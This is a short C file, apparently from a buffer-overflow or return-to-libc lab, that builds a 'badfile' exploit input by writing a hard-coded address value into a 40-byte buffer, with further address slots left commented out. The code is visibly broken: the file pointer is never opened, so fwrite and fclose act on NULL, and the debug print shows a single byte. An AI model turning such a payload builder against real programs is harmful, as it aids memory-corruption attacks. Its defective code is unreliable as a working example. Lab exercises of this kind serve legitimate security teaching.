/* Badfile builder */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char const *argv[]) {
	char buf[40];
	FILE *badfile = NULL;	
	

	*(long *) &buf[0] = 0x77179ab9f7ff7f;
	//*(long *) &buf[8] = /*address*/;
	//*(long *) &buf[16] = /*address*/;

	printf(" %x\n", buf[1]);
	fwrite(buf, sizeof(buf), 1, badfile);
	fclose(badfile);
	return 0;
}
